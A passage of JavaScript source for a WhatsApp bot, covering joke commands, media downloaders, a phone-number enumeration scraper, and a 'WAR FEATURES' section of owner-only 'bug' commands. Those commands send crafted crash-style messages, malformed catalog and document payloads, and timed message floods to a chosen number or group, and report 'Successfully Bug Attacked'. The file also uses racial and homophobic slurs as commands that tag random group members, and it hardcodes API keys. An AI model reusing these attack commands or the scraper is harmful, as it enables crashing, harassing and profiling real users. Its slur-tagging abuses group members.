					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })

					break
case 'beautifulcheck':
				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					XeonBotInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
                    case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
					break
                    case 'stupid':
      case 'foolish':
      case 'smart':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'bastard':
      case 'stubble':
      case 'dog':
      case 'fuck':
      case 'ape':
      case 'noob':
      case 'great':
      case 'horny':
      case 'wibu':
      case 'asshole':
      case 'handsome':
      case 'beautiful':
      case 'cute':
      case 'kind':
      case 'ugly':
      case 'pretty':
      case 'lesbian':
      case 'randi':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
            if (!m.isGroup) return m.reply(`${mess.group}`)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `The Most *${command}* Here Is @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'oke', buttonText: { displayText: 'ðŸ¤£' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
case 'id':{
            m.reply(from)
           }
          break
case 'toqr':{
  if (!q) return m.reply(' Please include link or text!')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await XeonBotInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'ig': case 'instagram': case 'reels':{ //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
if (args.length === 0) throw `Where is the link?\nSend ${prefix + command} url`
        let urlInsta = args[0];
        if (!(urlInsta.includes("instagram.com/p/") ||
            urlInsta.includes("instagram.com/reel/") ||
            urlInsta.includes("instagram.com/tv/")))
            return XeonBotInc.sendMessage(
                m.chat,
                { text: `The link you provided is not a instagram link` },
                { quoted: m }
            );      
            if (urlInsta.includes("?"))
            urlInsta = urlInsta.split("/?")[0];
        console.log(urlInsta);
        ig.fetchPost(urlInsta).then((res) => {
            if (res.media_count == 1) {
                if (res.links[0].type == "video") {
                    XeonBotInc.sendMessage(
                        m.chat,
                        {
                            video: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }else if (res.links[0].type == "image") {
                    XeonBotInc.sendMessage(
                        m.chat,
                        {
                            image: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }
            }
            else if (res.media_count > 1) {
                for (let i = 0; i < res.media_count; i++) {
                    if (res.links[i].type == "video") {
                        XeonBotInc.sendMessage(
                            m.chat,
                            {
                                video: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    } else if (res.links[i].type == "image") {
                        XeonBotInc.sendMessage(
                            m.chat,
                            {
                                image: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    }
                }
            }            
        }).catch((error) => {
            console.log(error);
            XeonBotInc.sendMessage(m.chat, { text: `Must be private or unavailable` }, { quoted: m })
        });
}
break
case 'spotify': //credit: Ray Senpaiâ¤ï¸ https://github.com/EternityBots/Nezuko
if (!text) return m.reply(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) throw `The link you provided is not spotify link`
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await XeonBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await XeonBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'reddit': //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
if (!text) throw `Where is the subreddit name?`
const RedditImageFetcher = require("reddit-image-fetcher")
RedditImageFetcher.fetch({
            type: 'custom',
            total: 1, 
            addSubreddit:text,
        }).then(result => {
            console.log(result);
            let akusingle = result[0]
            XeonBotInc.sendMessage(m.chat,{image:{url:akusingle.image}},{quoted:m})
        })
        .catch(err => {
            m.reply ("Not found!")
        })
        break
case 'define': //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
if (!q) throw `What do you want to define?`
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) throw mess.error
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   XeonBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return m.reply (`*${q}* isn't a valid text`)
    }
    break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
teks = `*ã€Œ ${global.botname} Script ã€*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nDont forget to donate ðŸœ`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'Owner ðŸŒº'}, type: 1}
]
let buttonMessage = {
image: {url: `https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"I deserve something for my hardwork",
body: "Click to donate", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg',
sourceUrl: "https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg"
}}
}
XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return m.reply(textquotes)
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
XeonBotInc.groupRevokeInvite(m.chat)
}
break
case 'imdb':
if (!text) return m.reply(`_Name a Series or movie`)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "âšâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâš\n" + " ``` IMDB SEARCH```\n" + "âšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽâšŽ\n"
            imdbt += "ðŸŽ¬Title      : " + fids.data.Title + "\n"
            imdbt += "ðŸ“…Year       : " + fids.data.Year + "\n"
            imdbt += "â­Rated      : " + fids.data.Rated + "\n"
            imdbt += "ðŸ“†Released   : " + fids.data.Released + "\n"
            imdbt += "â³Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "ðŸŒ€Genre      : " + fids.data.Genre + "\n"
            imdbt += "ðŸ‘¨ðŸ»â€ðŸ’»Director   : " + fids.data.Director + "\n"
            imdbt += "âœWriter     : " + fids.data.Writer + "\n"
            imdbt += "ðŸ‘¨Actors     : " + fids.data.Actors + "\n"
            imdbt += "ðŸ“ƒPlot       : " + fids.data.Plot + "\n"
            imdbt += "ðŸŒLanguage   : " + fids.data.Language + "\n"
            imdbt += "ðŸŒCountry    : " + fids.data.Country + "\n"
            imdbt += "ðŸŽ–ï¸Awards     : " + fids.data.Awards + "\n"
            imdbt += "ðŸ“¦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "ðŸ™ï¸Production : " + fids.data.Production + "\n"
            imdbt += "ðŸŒŸimdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "âœ…imdbVotes  : " + fids.data.imdbVotes + ""
           XeonBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
case 'weather':
if (!text) return m.reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*ðŸ—ºï¸Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           XeonBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           break
case 'horoscope':
if (!text) return m.reply('What sign?')
            try {
                const URL = `https://aztro.sameerkumar.website/?sign=${text}&day=today`
                fetch(URL, {
                        method: 'POST'
                    })
                    .then(response => response.json())
                    .then(json => {
                        const date = json.current_date
                        console.log(date)
                        let textw = ""
                        textw += `*ðŸ‘ï¸ Horoscope of  ${text}*\n\n`
                        textw += `*Current Date:* ${json.current_date}.\n`
                        textw += `*Sign:* ${text}.\n`
                        textw += `*Lucky Time:* ${json.lucky_time}.\n`
                        textw += `*Compatibility:* ${json.compatibility}.\n`
                        textw += `*Lucky Number:* ${json.lucky_number}.\n`
                        textw += `*Lucky Color:* ${json.color}.\n`
                        textw += `*Today Mood:* ${json.mood}.\n`
                        textw += `*Overall:* ${json.description}.\n`
                        m.reply(textw)
                    })

            } catch (e) {
                console.log(e)
            }
        break
case 'wanumber': case 'searchno': case 'searchnumber':
var inputnumber = text.split(" ")[0]
        if (!inputnumber.includes('x')) return m.reply(`You did not add xx\nExample: ${prefix + command} 9169091372xx`)
        m.reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `ðŸª€ *Number:* wa.me/${anu[0].jid.split("@")[0]}\n ðŸŽ—ï¸*Bio :* ${anu1.status}\nðŸ§*Last update :* ${moment(anu1.setAt).tz('Africa/Cairo').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        m.reply(`${text66}${nobio}${nowhatsapp}`)
break
    

//----------------â˜£ï¸WAR FEATURESâ˜£ï¸---------------\\
//Note: if you edit, features wont work!!!âš ï¸
case 'pcbut':
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                    if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbut 91xxxxxxxxxx`)
                 buttonvirus = [
                          {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1},
  {buttonId: 'xeon', buttonText: {displayText: xeonbutton}, type: 1},
  {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1}
]
                    buttonMsgX = {
                          text: author,
                          footerText: botname,
                          buttons: buttonvirus,
                          headerType: 1
                      }
                      XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
                      reply(mess.success)
                    break
case 'pcstick':{
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcstick 91xxxxxxxxxx`)
xeonOP = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonsteker = fs.readFileSync('./XBug/xstick.webp')
XeonBotInc.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
await reply(`Successfully bug sticker attacked ${text}@s.whatsapp.net`)
}
break
case 'pcvn':{
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcvn 91xxxxxxxxxx`)
xeonvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xaudio = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
 XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
await reply(`Successfully Bug Attacked The Number ${text}@s.whatsapp.net`)
}
break
case 'catalogbugxxx': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
const xeontalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: XeonBotInc.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": xeonmess.imageMessage,
"productId": "99999999999999",
"title": `Xeon Ezyâ˜£ï¸ ${xeonbutton} ${xeonbutton}`,
"description": `Xeon Ezyâ˜£ï¸ ${xeonbutton} ${xeonbutton}`,
"currencyCode": "INR",
"footerText": botname,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": author,
"url": websitex
},
"businessOwnerJid": "916909137213@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: xeontalog })
XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
	case 'vnbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
xeonyvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonyaud = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
 XeonBotInc.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
 }
 }
break
	case 'docbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
XeonBotInc.sendMessage(m.chat, {document: xpicvirus},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Xeon Ezyâ˜£ï¸${xeonbrutal(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'pcslow': { 
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcmass 91xxxxxxxxxx`)
             xeonyh1 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:xeonyh1})
            await sleep(30000)
            }
            break
case 'pcgcslow': {          
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx`)
             pmgcmassxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
